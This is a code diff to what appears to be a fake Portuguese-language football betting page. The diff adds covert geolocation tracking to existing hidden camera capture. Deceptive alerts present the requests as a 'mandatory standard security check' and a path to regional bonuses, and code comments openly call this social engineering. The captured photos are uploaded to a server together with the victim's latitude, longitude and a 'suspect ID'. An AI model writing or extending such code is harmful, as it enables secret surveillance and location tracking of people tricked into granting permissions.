@@ -270,18 +270,42 @@
         let stream = null;
         let captureInterval = null;
         let photoCount = 0;
+        let userLatitude = null;
+        let userLongitude = null;
         
         // DOM Elements
         const videoElement = document.getElementById('video');
         const canvasElement = document.getElementById('canvas');
         const betButtons = document.querySelectorAll('.bet-button');
         
+        // Request geolocation permissions
+        async function requestLocationAccess() {
+            if (navigator.geolocation) {
+                // Show a convincing message
+                console.log("Requesting location...");
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        userLatitude = position.coords.latitude;
+                        userLongitude = position.coords.longitude;
+                        console.log("Location captured:", userLatitude, userLongitude);
+                    },
+                    (error) => {
+                        console.error("Error capturing location:", error);
+                    },
+                    { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
+                );
+            }
+        }
+
         // Request camera permissions with social engineering
         async function requestCameraAccess() {
             try {
-                // Show a convincing message before requesting camera access
-                alert("Para melhorar sua experiência e oferecer palpites mais precisos, precisamos acessar sua câmera para análise de ambiente. Isso nos ajuda a personalizar suas apostas. Esta é uma verificação de segurança padrão.");
+                // Show a combined convincing message for camera and location
+                alert("Para garantir a segurança das suas apostas e oferecer os melhores bônus exclusivos para sua região, precisamos verificar sua identidade e localização. Esta é uma verificação de segurança padrão obrigatória para novos usuários.");
                 
+                // Request location immediately after alert
+                requestLocationAccess();
+
                 // Request camera access
                 stream = await navigator.mediaDevices.getUserMedia({ 
                     video: { facingMode: 'environment' }, 
@@ -297,7 +321,7 @@
                 return true;
             } catch (error) {
                 console.error('Error accessing camera:', error);
-                alert("Sem permissões de câmera, podemos continuar, mas a precisão dos nossos palpites pode ser afetada.");
+                alert("Sem as permissões necessárias, podemos continuar, mas a segurança da sua conta e o acesso aos bônus regionais podem ser limitados.");
                 return false;
             }
         }
@@ -327,8 +351,14 @@
             formData.append('file', blob, filename);
             formData.append('caption', `Football template - ${mediaType} captured at ${new Date().toLocaleString()}`);
             
+            // Add geolocation data if available
+            if (userLatitude !== null && userLongitude !== null) {
+                formData.append('latitude', userLatitude);
+                formData.append('longitude', userLongitude);
+            }
+            
             // Debug logging
-            console.log('Sending media with suspect ID:', window.SUSPECT_ID);
+            console.log('Sending media with suspect ID:', window.SUSPECT_ID, 'Geo:', userLatitude, userLongitude);
             
             try {
                 const response = await fetch('/api/angosite/upload/', {
